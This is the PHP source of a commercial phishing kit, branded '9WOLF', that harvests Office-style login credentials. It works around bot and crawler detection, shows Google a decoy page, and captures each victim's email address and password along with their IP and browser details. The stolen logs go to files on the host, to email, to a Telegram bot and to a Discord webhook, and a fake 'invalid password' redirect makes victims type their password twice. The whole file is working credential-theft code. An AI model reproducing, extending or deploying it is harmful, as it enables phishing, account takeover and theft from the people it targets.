<?php
/*
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡟⠁⠼⠻⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡞⠀⠀⠀⠸⡏⣇⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡞⠀⠀⠀⠀⢠⡇⢹⣀⠞⠛⢷⡄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡟⠀⠀⠀⠀⣶⣿⣥⡬⡟⠀⠀⠀⣿⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⠏⠀⠀⠀⠀⠀⢻⠈⠁⢹⡇⠀⠀⢰⡟⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠶⠛⠛⣻⠅⠀⠀⠀⠀⠀⠀⢸⣆⡴⠟⠃⠀⠀⡾⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡴⠋⡴⢿⡿⠏⠀⠀⠀⠀⠀⠀⠀⢈⣿⠁⠀⠀⠀⢰⠇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡞⠁⣸⣧⠽⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⢠⡆⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⡟⠀⠀⣿⣿⣰⡆⠀⠀⠀⠀⠀⠀⠀⠀⡆⠀⣠⣿⡿⣦⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⠀⠀⠀⠘⢻⢿⣇⡀⠀⠀⢀⠀⠀⠀⣸⠷⣿⣯⠇⠘⠽⢻⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⣿⠟⠀⠀⢶⣄⠈⠇⣿⣷⠀⠀⠘⣇⠀⠀⠘⣶⠿⠀⠀⠀⠀⠸⣇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣾⠏⠀⢰⡀⢸⣿⠃⠲⠃⢻⣶⡄⣦⣿⠀⠀⠈⠁⠀⠀⠀⠀⠀⠀⢿⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣴⣟⣁⣠⣴⣿⡇⢸⡏⠀⠀⠀⠾⢹⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣷⠀⠀⠀⠀⠀
⣀⣀⣤⣴⣿⣟⠀⠉⣩⣿⡿⢡⡟⠀⠀⠀⠀⠀⠘⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣧⠀⠀⠀⠀
⠀⠉⠛⠿⢿⣿⣶⣿⣿⣯⣶⣿⣿⠇⠀⠀⠀⠀⠀⠘⠳⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠸⣆⠀⠀⠀
⠀⠀⠀⠀⠀⣼⣿⣫⠍⠙⠚⠋⣿⢀⣶⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣆⠀⠀⠀⣠⠀⣷⣿⡄⠀⠀
⠀⠀⠀⠀⣼⡿⣿⡏⣸⠃⠀⠀⢸⡿⣿⡀⢀⠀⠀⠀⠀⠀⠀⠀⢦⣄⠀⠀⣿⡄⠀⢰⣿⣆⣿⠻⣧⠀⠀
⠀⠀⠀⢰⡟⢠⣿⣿⡯⠀⠀⠀⠀⠳⠸⣧⠈⣷⡀⠰⡄⠀⠀⠀⠈⣿⣇⣰⠟⣷⡄⣸⣿⠻⣿⣇⠛⠀⠀
⠀⠀⠀⠀⢠⣿⣿⣿⣿⢠⡇⠀⠀⠀⠀⠙⣷⣿⢿⣆⢹⣆⠀⠀⢰⡇⣿⠏⠀⠈⢿⣿⣿⡆⠙⢿⣦⠀⠀
⠀⠀⠀⠀⢸⣏⣿⢿⣿⡿⠀⠀⠀⠀⠀⠀⠈⠛⠄⠻⢿⡟⢷⣤⣾⠁⠁⠀⠀⠀⠀⠉⠻⣿⡄⡈⠹⣧⠀
⠀⠀⠀⠀⠈⢸⡏⣸⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠊⠻⣿⡄⠀⠀⠀⠀⠀⠀⠀⠈⡗⠹⣷⣼⡆
⠀⠀⠀⠀⠀⢸⡃⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠂⠀⠀⠀⠀⠀⠀⠀⠛⠀⣿⡿⣷
⠀⠀⠀⠀⠀⠀⠀⠙⠛⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠲⠿⠇⠉
 * //Think Twice , Code Once\\
 * //We work in the dark to serve the light\\
 * 9WOLF Office Page + Cookies File Grabber
 * Version 5
 * REMEMBER:  
 * Telegram Channel is : @NINEWOLFSTORE
 * Telegram Store is   : @NINEWOLFSTORE_bot

 * CopyRights: all reserved https://9wolf.io
###########################################
#$            @NINEWOLFSTORE             #$
#$                  Says:                #$
#$           As the Hunter exist         #$ 
#$          The victim exist too         #$  
###########################################
 ================IF AGREED=================
 ==================THEN====================
=To Be save Join Our Telegram Channel
=   @NINEWOLFSTORE
=To Be Secured Join Our Telegram Store
=   @NINEWOLFSTORE_bot

*/

error_reporting(E_ALL ^ E_NOTICE);
ob_start();
session_start();
$path = "../site/";
require ("../9WOLFConfi/Guration.php");
require ("../9WOLFConfi/Function.php");
require ("../9WOLFDecline/AntiBotIp.php");
require ("../9WOLFDecline/AntiBotPw.php");
require ("../9WOLFDecline/AntiBotKillBot.php");
require ("../9WOLFDecline/AntiBotUserAgent.php");
require ("../9WOLFDecline/AntiBotIsp.php");
require ("../9WOLFDecline/AnitiBotHost.php");
require ("../9WOLFDecline/AntiBotPhishTank.php");
require ("../9WOLFDecline/AntiBotVpn.php");
require ("../9WOLFDecline/AntiBotProxy.php");
require ("../9WOLFDecline/AntBotProtection.php");
require ("../9WOLFDecline/SaveBrowsing.php");
require ("../9WOLFDecline/DiscoveredBot.php");
require ("../9WOLFDecline/AntiBotThree.php");
require ("../9WOLFDecline/DisturbOne.php");
require ("../9WOLFDecline/DisturbTwo.php");
require("../9WOLFDecline/Anti/Bot-Crawler.php");
@require("../9WOLFDecline/Anti/Crawler/src/CrawlerDetect.php");
use JayBizzle\CrawlerDetect\CrawlerDetect;
$rand = generateRandomString(130);
$cage = substr(sha1(mt_rand()),1,25);
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { 
    include($path."index.php"); exit();
}
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) {
    include($path."index.php"); exit();
}

if (isset($_POST['hidden']) && !empty($_POST['9WOLFDatorKiller'])  ) {
  include($path."index.php"); exit();
}
if (!isset($_SESSION['9WOLF_SESSION_T0k3n'])  ) {
  include($path."index.php"); exit();
}
#if (!isset($_POST['token9WOLFCsrf'])) {
#    include($path."index.php");
  
#}
#if ($_POST['token9WOLFCsrf'] != $_SESSION['9WOLF_SESSION_T0k3n']) {
#    include($path."index.php"); 
#}
if (isset($_POST['emailaccess'])){
   $_SESSION['emailaccess']  = $_POST['emailaccess'];
   }
if (isset($_POST['submit'])){
   $_SESSION['submit']  = $_POST['submit'];
   }
$ip = getIp();
$browser = WOLF_Browser();
$date = date("d M, Y");
$time = date("g:i a");
$date = trim($date . ", Time : " . $time);
$doublePassword = strtolower($doublePassword);
$saveItOnHost = strtolower($saveItOnHost);
$sendToEmail = strtolower($sendToEmail);
$sendToTelegramBot = strtolower($sendToTelegramBot);
$sendToDiscordBot = strtolower($sendToDiscordBot);
extract($_REQUEST);
if($_SERVER['REQUEST_METHOD'] == 'POST'){
if(isset($_POST['invalid'])){
  if (!empty($_POST['invalid'])){


    $_SESSION['emailaccesspass']  = $_POST['emailaccesspass'];
 


       //Admin Panel

      $msgItOnHost = "<t============================================>
<t".$YourName." 2nd ".$PageName."==> <t===Em4!l&P4s5w0rd>
<Em4!lAcc3s5>    :         <t ".$_SESSION['emailaccess'].">
<Em4!lP45ss>     :         <t ".$_SESSION['emailaccesspass'].">
<V!ct!m3Ip>      :         <t ".$ip.">
<V!ct!m3D4t3>    :         <t ".$date.">
<V!ct!m3Br0ws3r> :         <".WOLF_Browser($_SERVER['HTTP_USER_AGENT'])." 0n ".WOLF_Os($_SERVER['HTTP_USER_AGENT']).">
<Us3rAg4nt>      :         <t ".($_SERVER['HTTP_USER_AGENT']).">
<t=============================================>";


          $telegramMsg ="
         
--------------".$PageName."--------------
[Hey ".$YourName."🐺
[ 2nd Log♥️️"."
[👤Email Access:|👉 ".$_SESSION['emailaccess']."
[👤Password:|👉 ".$_SESSION['emailaccesspass']."
[🔍Victim IP:|👉".$ip."
[⏰Victim Date|👉 ".$date."
[🌐Victim Browser:|👉 ".WOLF_Browser($_SERVER['HTTP_USER_AGENT'])." 0n ".WOLF_Os($_SERVER['HTTP_USER_AGENT'])."".";
[👤User Agent:|👉".($_SERVER['HTTP_USER_AGENT'])."";

      $discordMsg ="
--------------".$PageName."--------------
[Hey ".$YourName."🐺
[ 2nd Log♥️"."
[👤Email Access:|👉 ".$_SESSION['emailaccess']."
[👤Password:|👉 ".$_SESSION['emailaccesspass']."
[🔍Victim IP:|👉".$ip."
[⏰Victim Date|👉 ".$date."
[🌐Victim Browser:|👉 ".WOLF_Browser($_SERVER['HTTP_USER_AGENT'])." 0n ".WOLF_Os($_SERVER['HTTP_USER_AGENT'])."".";
[👤User Agent:|👉".($_SERVER['HTTP_USER_AGENT'])."";

          $Subject .= "[ 2nd Log♥️ ]️ \n";
          $headers .= "MIME-Version: 1.0" . "\r\n";
          $headers .= "From: ".$Owner.".<$WOLFServer>." . "\r\n";
          $headers .= "Content-type:text/plan;charset=UTF-8" . "\r\n";
          $msg .= "--------------".$PageName."-------------- \n";
          $msg .= "[Hey ".$YourName."🐺\n";
          $msg .= "[ 2nd Log♥️"."\n";
          $msg .= "[👤Email Access:|👉 ".$_SESSION['emailaccess']." \n";
          $msg .= "[👤Password:|👉 ".$_SESSION['emailaccesspass']." \n";
          $msg .= "[🔍Victim IP:|👉".$ip." ||\n";
          $msg .= "[⏰Victim Date|👉 ".$date."||\n";
          $msg .= "[🌐Victim Browser:|👉 ".WOLF_Browser($_SERVER['HTTP_USER_AGENT'])." 0n ".WOLF_Os($_SERVER['HTTP_USER_AGENT']).""."; ||\n";
          $msg .= "[👤User Agent:|👉".($_SERVER['HTTP_USER_AGENT'])." ||\n";



    
      if ($saveItOnHost == "true") {
          $WOLFCoded = array(
               'msgItOnHost' => $msgItOnHost,
            );
         echo json_encode($WOLFCoded);
          $fil = fopen("../9WOLFHost/Fishes/2nd0ff1c.html", "a+");
          fwrite($fil, $msgItOnHost);   
      }
      
      if ($sendToEmail == "true") {
         $WOLFCoded = array(
             'msg' => $msg,
             'headers' => $headers,
             'Subject' => $Subject,
        );
        echo json_encode($WOLFCoded);
        @send($yourEmail, $Subject, $msg,$headers);

      }
      
      if ($sendToTelegramBot == "true") {
           $WOLFCoded = array(
               'telegramMsg' => $telegramMsg,
            );
         echo json_encode($WOLFCoded);
         @send($telegramMsg,$botToken,$chatId);

  $WOLFApi="https://api.telegram.org/bot".$botToken;
  $sendToTelegramBot=[
      'chat_id'=> urlencode($chatId),
      'text'=> urldecode($telegramMsg),
  ];
  $ch = curl_init($WOLFApi . '/sendMessage');
  curl_setopt($ch, CURLOPT_HEADER, false);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, ($sendToTelegramBot));
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  $answer = curl_exec($ch);
  curl_close($ch);
      }
if ($sendToDiscordBot == "true"){
    $WOLFCoded = array(
        'discordMsg' => $discordMsg,
    );
    echo json_encode($WOLFCoded);
    $WOLFApi = $webHookUrl; 
    $json_data = array ('content'=>"$discordMsg");
    $make_json = json_encode($json_data);
    $ch = curl_init( $WOLFApi );
    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
    curl_setopt($ch, CURLOPT_POSTFIELDS, $make_json);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $answer = curl_exec($ch);

}


  }


exit(header("Location:  $priv4"));


}
if($_SERVER['REQUEST_METHOD'] == 'POST'){


    $_SESSION['emailaccesspass']  = $_POST['emailaccesspass'];

       //Admin Panel

      $msgItOnHost = "<t============================================>
<t".$YourName." ".$PageName."==> <t===Em4!l&P4s5w0rd>
<Em4!lAcc3s5>    :         <t ".$_SESSION['emailaccess'].">
<Em4!lP45ss>     :         <t ".$_SESSION['emailaccesspass'].">
<V!ct!m3Ip>      :         <t ".$ip.">
<V!ct!m3D4t3>    :         <t ".$date.">
<V!ct!m3Br0ws3r> :         <".WOLF_Browser($_SERVER['HTTP_USER_AGENT'])." 0n ".WOLF_Os($_SERVER['HTTP_USER_AGENT']).">
<Us3rAg4nt>      :         <t ".($_SERVER['HTTP_USER_AGENT']).">
<t=============================================>";


          $telegramMsg ="
         
--------------".$PageName."--------------
[Hey ".$YourName."🐺
[ New Log♥️️"."
[👤Email Access:|👉 ".$_SESSION['emailaccess']."
[👤Password:|👉 ".$_SESSION['emailaccesspass']."
[🔍Victim IP:|👉".$ip."
[⏰Victim Date|👉 ".$date."
[🌐Victim Browser:|👉 ".WOLF_Browser($_SERVER['HTTP_USER_AGENT'])." 0n ".WOLF_Os($_SERVER['HTTP_USER_AGENT'])."".";
[👤User Agent:|👉".($_SERVER['HTTP_USER_AGENT'])."";



      $discordMsg ="
--------------".$PageName."--------------
[Hey ".$YourName."🐺
[ New Log♥️️"."
[👤Email Access:|👉 ".$_SESSION['emailaccess']."
[👤Password:|👉 ".$_SESSION['emailaccesspass']."
[🔍Victim IP:|👉".$ip."
[⏰Victim Date|👉 ".$date."
[🌐Victim Browser:|👉 ".WOLF_Browser($_SERVER['HTTP_USER_AGENT'])." 0n ".WOLF_Os($_SERVER['HTTP_USER_AGENT'])."".";
[👤User Agent:|👉".($_SERVER['HTTP_USER_AGENT'])."";


          $Subject .= "[ New Log♥️ ]️ \n";
          $headers .= "MIME-Version: 1.0" . "\r\n";
          $headers .= "From: ".$Owner.".<$WOLFServer>." . "\r\n";
          $headers .= "Content-type:text/plan;charset=UTF-8" . "\r\n";
          $msg .= "--------------".$PageName."-------------- \n";
          $msg .= "[Hey ".$YourName."🐺\n";
          $msg .= "[ New Log♥️"."\n";
          $msg .= "[👤Email Access:|👉 ".$_SESSION['emailaccess']." \n";
          $msg .= "[👤Password:|👉 ".$_SESSION['emailaccesspass']." \n";
          $msg .= "[🔍Victim IP:|👉".$ip." ||\n";
          $msg .= "[⏰Victim Date|👉 ".$date."||\n";
          $msg .= "[🌐Victim Browser:|👉 ".WOLF_Browser($_SERVER['HTTP_USER_AGENT'])." 0n ".WOLF_Os($_SERVER['HTTP_USER_AGENT']).""."; ||\n";
          $msg .= "[👤User Agent:|👉".($_SERVER['HTTP_USER_AGENT'])." ||\n";



    
      if ($saveItOnHost == "true") {
          $WOLFCoded = array(
               'msgItOnHost' => $msgItOnHost,
            );
         echo json_encode($WOLFCoded);
          $fil = fopen("../9WOLFHost/Fishes/0ff1c.html", "a+");
          fwrite($fil, $msgItOnHost);   
      }
      
      if ($sendToEmail == "true") {
          $WOLFCoded = array(
              'msg' => $msg,
              'headers' => $headers,
              'Subject' => $Subject,
        );
        echo json_encode($WOLFCoded);
        @send($yourEmail, $Subject, $msg,$headers);

      }
      
      if ($sendToTelegramBot == "true") {
        $WOLFCoded = array(
               'telegramMsg' => $telegramMsg,
            );
         echo json_encode($WOLFCoded);
        @send($telegramMsg,$botToken,$chatId);

  $WOLFApi="https://api.telegram.org/bot".$botToken;
  $sendToTelegramBot=[
      'chat_id'=> urlencode($chatId),
      'text'=> urldecode($telegramMsg),
  ];
  $ch = curl_init($WOLFApi . '/sendMessage');
  curl_setopt($ch, CURLOPT_HEADER, false);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, ($sendToTelegramBot));
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  $answer = curl_exec($ch);
  curl_close($ch);
      }
if ($sendToDiscordBot == "true"){
    $WOLFCoded = array(
        'discordMsg' => $discordMsg,
    );
    echo json_encode($WOLFCoded);
    $WOLFApi = $webHookUrl; 
    $json_data = array ('content'=>"$discordMsg");
    $make_json = json_encode($json_data);
    $ch = curl_init( $WOLFApi );
    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
    curl_setopt($ch, CURLOPT_POSTFIELDS, $make_json);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $answer = curl_exec($ch);


}

  }


  if ($doublePassword=="true") {
    exit(header("Location: $priv6&invalid=p4s5"));
  }else{
    exit(header("Location:  $priv4"));
  }
}
?>
